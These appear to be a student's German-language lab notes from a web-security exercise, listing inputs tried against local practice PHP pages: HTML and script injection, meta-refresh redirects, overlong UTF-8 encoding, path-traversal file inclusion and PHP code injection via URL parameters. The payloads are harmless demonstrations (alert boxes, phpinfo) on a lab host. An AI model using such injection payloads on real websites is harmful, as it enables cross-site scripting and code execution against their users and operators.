## 6.1.1.1 - 1.php
### Schreibe deinen Namen in Italic
Einfach `<i>Ertugrul</i>` in die Box eingeben!

### Namen in anderer Schriftart anzeigen
```html
<span style="color: red">Ertugrul</span>
```

### Schreibe deinen Namen in weiß
```html
<span style="color: white">Ertugrul</span>
```

### Ändere die Background Color zu blau
```html
<style>body {background-color: blue;}</style>
```

### Füge ein weiteres Feld ein
```html
Ertugrul<br><input />
```


## 6.1.1.2 - 2.php
## Versuche eine Injection
```html
myname"/><script>alert('hey')</script><span class="
```

## 6.1.1.3 - Zurück zu 1.php
### Versuche eine Weiterleitung mittels Meta Tag
```html
<meta http-equiv="refresh" content="0; URL=http://google.de/">
```

### Versuche einen IFrame einzubinden
```html
<iframe src="2.php" height="200" width="300" title="Iframe Example"></iframe>
```

## 6.1.1.4 - 4.php
### Versuche eine Injection
```html
<xmp></xmp><script>alert("Hello world");</script><xmp>
```

## 6.1.1.5 - 5.php
### Versuche einen Overlong UTF-8 Character (2 Bytes statt 1) zu injezieren
```html
http://192.168.178.93/html/4.php?name=%C0%BCscript%C0%BEalert("hi")%C0%BC/script%C0%BE
```

```ad-note
Achtung: Dies klappt mit neuen Browsern nicht!
```

## 6.1.2.1 - 1.php
### Versuche die .config.php Datei zu laden
**Warning**: include(.config): failed to open stream: No such file or directory in **/var/www/html/php/1.php** on line **23**  
  
**Warning**: include(): Failed opening '.config' for inclusion (include_path='.:/usr/share/php') in **/var/www/html/php/1.php** on line **23**

### Lade eine random php Seite
https://learningapps.org/index.php

### Lade die phpinfo.php Datei
`../phpinfo.php`

### Welche siehst du, die lokale oder den remote?
Remote, php läuft auf dem Server

### Wie könnte man hier Code injezieren? (Tipp: Mime Types)

### Was müsste man auf dem Webserver machen, um PHP Code zu injezieren?

## 6.1.2.2 - 2.php
### Wie könnte man hier Code injezieren?
`<option value="../phpinfo">../phpinfo</option>`
- Umgehen des "Schutzes", in dem Man einfach ein ".php" am Ende weglässt (Anders als bei 1.php wo man `../phpinfo.php` schreiben müsste)

## 6.1.2.3 - 3.php
### Einfach nur "phpinfo()" einzugeben würde nicht funktionieren, warum?
- Bei mir hat folgendes funktioniert:
- `http://192.168.178.93/php/3.php?maths=phpinfo%28%29`

### 6.1.2.4 - 4.php
### Wie könnte man die Anwendung angreifen?
`http://192.168.178.93/php/4.php?op_1=phpinfo&op=(&op_2=)`